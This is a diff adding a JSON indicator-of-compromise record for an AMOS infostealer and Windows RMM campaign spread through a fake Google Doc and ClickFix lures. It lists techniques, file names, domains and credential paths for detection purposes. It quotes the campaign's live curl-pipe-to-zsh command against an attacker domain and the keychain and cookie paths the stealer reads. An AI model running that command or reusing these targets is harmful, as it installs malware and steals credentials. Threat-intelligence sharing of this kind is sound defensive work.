@@ -1,0 +1,349 @@
+{
+  "malware_family": "AMOS",
+  "threat_actor": "",
+  "platforms": [
+    "windows",
+    "macos"
+  ],
+  "summary": "A post-DEF CON X DM phishing campaign lures security researchers to a real Google Doc with a container-bound Apps Script sidebar that fakes a decryption failure and ClickFix instructions, beacons victim IP/geolocation/wallet presence to the actor's Telegram, and routes macOS and Windows users down separate malware chains. macOS victims receive an AMOS infostealer variant via a piped zsh command or a signed-out DMG download, while Windows victims receive a ClickOnce app, an encoded PowerShell loader, and three encrypted payloads (NetSupport Manager RMM, a stolen-Lenovo-signed local proxy that installs a self-generated CA, and a Ledger wallet implant).",
+  "mitre_techniques": [
+    "T1204.004",
+    "T1055.012",
+    "T1127.001",
+    "T1547.001",
+    "T1543.003",
+    "T1053.005",
+    "T1553.001",
+    "T1553.002",
+    "T1553.004",
+    "T1113",
+    "T1555.001",
+    "T1539",
+    "T1219",
+    "T1071"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "unique_string",
+      "value": "VIEW",
+      "context": "Apps Script Telegram beacon action code on doc open",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DL_EXE",
+      "context": "Apps Script Telegram beacon action code",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "CLICKONCE",
+      "context": "Apps Script Telegram beacon action code",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "COPY_MAC",
+      "context": "Apps Script Telegram beacon action code",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "COPY_WIN",
+      "context": "Apps Script Telegram beacon action code",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "DL_DMG",
+      "context": "Apps Script Telegram beacon action code",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MOBILE",
+      "context": "Apps Script beacon sent for mobile visitors",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -fsSL https://apple-googleapi.com/i | zsh",
+      "context": "ClickFix paste into Terminal; piped zsh macOS chain",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "GAPI_Update.dmg",
+      "context": "macOS manual-update DMG hosted on actor GitHub",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "app.crc32",
+      "context": "Ledger implant bot ID (16 hex chars) stored in app data folder",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_value",
+      "value": "Ledger Wallet Installer",
+      "context": "Run key pointing at bare msbuild invocation",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "CN=WR3",
+      "context": "Self-signed CA installed in root store, poses as Google Trust Services",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "www.virustotal.com",
+      "context": "Leaf cert SAN covering legitimate domain and localhost",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "LocalProxy",
+      "context": "Firewall rule name added by second payload for TLS interception",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Manager.zip",
+      "context": "Stage-three NetSupport Manager 14.10.0004 archive",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Localcertificate.zip",
+      "context": "Stage-three TLS-intercepting local proxy archive",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "asusdriverld.zip",
+      "context": "Stage-three Ledger wallet implant archive",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "MsBuild.exe",
+      "context": "Hollowed, imports only kernel32; Run key target",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "Start-Process -Verb RunAs",
+      "context": "Payloads relaunched detached/hidden 20s later for elevation",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "Google API Connector",
+      "context": "Fake app name shown to Windows manual-download victims",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "@sentry/electron",
+      "context": "Module used to rebuild DocSend registration protocol",
+      "specificity": "medium",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "Keychains/login.keychain-db",
+      "context": "AMOS string targeting macOS login keychain",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "Group Containers/group.com.apple.notes/NoteStore.sqlite",
+      "context": "AMOS string targeting Apple Notes store",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sw_vers -productVersion | cut -d. -f1",
+      "context": "AMOS embedded command to fingerprint macOS version",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "Cookies/Cookies.binarycookies",
+      "context": "AMOS string targeting browser cookie stores",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "apple-googleapi.com",
+      "context": "Host for macOS zsh ClickFix pipe",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://apple-googleapi.com/i",
+      "context": "Fetch URL in macOS ClickFix chain",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "web12api.com",
+      "context": "Malicious infra; DocSend sibling returned 404",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "eu03hub.com",
+      "context": "Host serving password-protected stage-three archives",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/get_file",
+      "context": "Archive download endpoint on eu03hub.com",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/start",
+      "context": "Reconstructed registration request path returned by live SignNow sibling",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "GTA6Mainserver.com",
+      "context": "Newly registered domain on NetSupport Manager C2 IP",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "GTA6Mainweb.com",
+      "context": "Newly registered domain on NetSupport Manager C2 IP",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "macho",
+    "script"
+  ]
+}
